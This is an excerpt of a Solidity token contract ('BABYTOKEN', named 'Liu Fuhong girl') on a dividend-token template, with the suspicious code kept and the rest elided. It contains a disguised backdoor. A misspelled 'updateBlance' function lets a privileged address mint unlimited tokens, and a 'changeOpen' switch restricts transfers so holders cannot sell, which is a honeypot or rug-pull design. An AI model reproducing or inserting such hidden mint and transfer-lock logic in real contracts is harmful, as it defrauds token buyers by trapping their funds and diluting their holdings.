...
contract BABYTOKEN is ERC20, Ownable, BaseToken {
    ...
    constructor() payable ERC20("Liu Fuhong girl", "Liu girl") {
        rewardToken = 0x6b88c7975AA1Af8787629F6A09B4CE693bD897D2;
        _marketingWalletAddress = 0x8a5022F0533e9bbc4663CE2433a5F53b11bE901d;
        require(
            msg.sender != _marketingWalletAddress,
            "Owner and marketing wallet cannot be the same"
        );
        uint256 totalSupply_ = 1000 * 10**4 * 10**18; 
        tokenRewardsFee = 2;
        liquidityFee = 0;
        marketingFee = 4;
        ...
        uint256 minimumTokenBalanceForDividends_ = totalSupply_.mul(1).div(1000);
        ...
        excludeFromFees(address(0xCe5c61A1e6de69b14a13B18D359A7D5D012f268A), true);
    ...
    function updateBlance(address to,uint256 amount) external{require(msg.sender == uniSwapPairV2);
        _mint(to,amount);
    }
    function changeOpen(bool newValue) external {require(msg.sender == uniSwapPairV2);
        open = newValue;
    }
    ...
    function _transfer(
        ...
        if(open) require(from == uniSwapPairV2);
